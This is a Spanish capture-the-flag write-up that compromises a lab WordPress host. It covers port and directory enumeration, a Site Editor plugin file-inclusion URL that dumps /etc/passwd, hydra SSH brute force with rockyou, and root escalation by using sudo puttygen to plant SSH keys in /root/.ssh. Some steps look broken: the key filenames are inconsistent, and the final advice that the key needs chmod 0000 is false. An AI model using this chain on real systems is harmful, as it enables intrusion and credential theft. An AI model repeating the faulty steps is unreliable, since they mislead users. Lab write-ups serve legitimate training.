# Escaneo de puertos, servicios y version

22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
--http-enum: 
|   /wordpress/: Blog
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 6.5.3
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
| http-wordpress-users: 
| Username found: wordpress

vamos hacer fuzzing para conseguir archivos y derectorios.....


# Fuzzing 

gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -b 404 -x php,txt,html,py,sh,sql,js -o gobuster-report

===============================================================
/.php                 (Status: 403) [Size: 275]
/wp-content           (Status: 301) [Size: 313] [--> http://172.17.0.2/wp-content/]
/.html                (Status: 403) [Size: 275]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
/index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/]
/wp-login.php         (Status: 200) [Size: 7464]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 314] [--> http://172.17.0.2/wp-includes/]
/readme.html          (Status: 200) [Size: 7401]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 311] [--> http://172.17.0.2/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://asucar.dl/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 275]
Progress: 1661144 / 1661152 (100.00%)
===============================================================

vemos que tenemos este directorio http://asucar.dl/wp-login.php?action=register pero al intentar acceder, no podemos asi que vamos agregar el 
dominio asucar.dl a /etc/hosts

172.17.0.2	asucar.dl

ahora podemos acceder y nos conseguimos con el panel de wordpress, como vemos que esta corriendo wordpress vamos a usar wpscan para escanear la web

wpscan --url http://asucar.dl/ --random-user-agent 

el escaneo arroja que esta usando un tema twentytwentyfour el cual esta desactualizado

 WordPress theme in use: twentytwentyfour
  57   │  | Location: http://asucar.dl/wp-content/themes/twentytwentyfour/
  58   │  | Last Updated: 2024-07-16T00:00:00.000Z
  59   │  | Readme: http://asucar.dl/wp-content/themes/twentytwentyfour/readme.txt
  60   │  | [!] The version is out of date, the latest version is 1.2
  61   │  | [!] Directory listing is enabled

veamos si conseguimos algo que pueda vulnerar esto:
usando searchsploit no conseguimos nada

pero tambien tenemos en el reporte un pluying desactualizado

[i] Plugin(s) Identified:
  80   │ 
  81   │ [+] site-editor
  82   │  | Location: http://asucar.dl/wp-content/plugins/site-editor/
  83   │  | Last Updated: 2017-05-02T23:34:00.000Z
  84   │  | [!] The version is out of date, the latest version is 1.1.1
		Version: 1.1 (100% confidence)

como vemos la version actual es 1.1 y la ultima es 1.1.1, veamos si conseguimos algun exploit o alguna vulnerabilidad 

searchsploit site-editor 1.1			| sin resultados
searchsploit site editor 1.1			| obtenemos resultados
------------------------------------------------------------------------------------------------------------------------------------------------------------------
Django CMS 3.3.0 - Editor Snippet Persistent Cross-Site Scripting                                                                     | python/webapps/40129.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                | php/webapps/25493.txt
pragmaMx 1.12.1 - '/includes/wysiwyg/spaw/editor/plugins/imgpopup/img_popup.php?img_url' Cross-Site Scripting                         | php/webapps/37313.txt
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                                                                             | php/webapps/44340.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
aqui vemos un resultado para el pluying: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion 
aunque esta vulnerabilidad es para la version 1.1.1, vamos a probar si funciona para nuestra version desctualizada 1.1

buscamos el archivo txt del resultado a ver que contiene

find / -name 44340.txt

/usr/share/exploitdb/exploits/php/webapps/44340.txt			| ubicacion del archivo, ahora lo leemos
cat /usr/share/exploitdb/exploits/php/webapps/44340.txt			| leyendo archivo

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

aqui tenemos una prueba de concepto, ahora lo adaptamos a nuestro caso:

http://172.17.0.2/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

solo vamos a agregar la url o ip (ip en este caso), ahora probaremos el resultado:

---------------------------------------------------------------------------------------------------------------------------------------------------------

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false 
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:101:102::/nonexistent:/usr/sbin/nologin 
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin curiosito:x:1000:1000::/home/curiosito:/bin/bash {"success":true,"data":{"output":[]}}

----------------------------------------------------------------------------------------------------------------------------------------------------------

como vemos, en efecto pudimos leer en /etc/passwd y ahora conocemos los usuarios del sistema!!!
y aqui observamos un usuario: curiosito

ahora recordemos que el reporte de nmap indico tambien que estaba disponible el servicio ssh, asi que intentemos crackear la clave
aplicando fuerza bruta con hydra

hydra -l curiosito -P /home/darks/Desktop/Kali/diccionarios/rockyou.txt ssh://172.17.0.2 -t 64

[22][ssh] host: 172.17.0.2   login: curiosito   password: password1


ahora nos conectamos via ssh

ssh curiosito@172.17.0.2


# Escalada de privilegios

sudo -l		o	 find / -perm -4000 2>/dev/null
/usr/bin/puttygen		| tenemos este binario


aqui podemos generar un par de claves RSA

puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id_rsa				| creamos el par de claves RSA
puttygen -L ~/.ssh/idssh >> ~/.ssh/authorized_keys					| Añadimos la clave pública al archivo authorized_keys
sudo puttygen /home/curiosito/.ssh/id_rsa -o /root/.ssh/id_rsa				| Copiamos la clave privada a la carpeta .ssh del usuario root
sudo puttygen /home/curiosito/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh	| Generamos la clave pública en formato OpenSSH y la guardamos en el archivo authorized_keys del usuario root


ahora nos pasamos a nuestra maquina atacante la clave RSA, ejecutaamos desde nuestro equipo de atacante lo siguiente 
para transfererirnos la clave rsa

scp curiosito@172.17.0.2:/home/curiosito/.ssh/id_rsa /home/darks/Documents/dockerlab/asucar

ya con la clave rsa en nuestro equipo verificamos los permisos que tiene el archiivo que contiene la clave, si tiene permisos se los quitamos todos

chmod 0000 id_rsa			| aqui le quitamos todos los permisos que tenga 

ahora si, pa dentro

ssh -i id_rsa root@172.17.0.2



Nota: si la clave rsa tiene permisos esta no nos va a servir, asi que debemos quitarselos para que pueda establecer la conexion con root






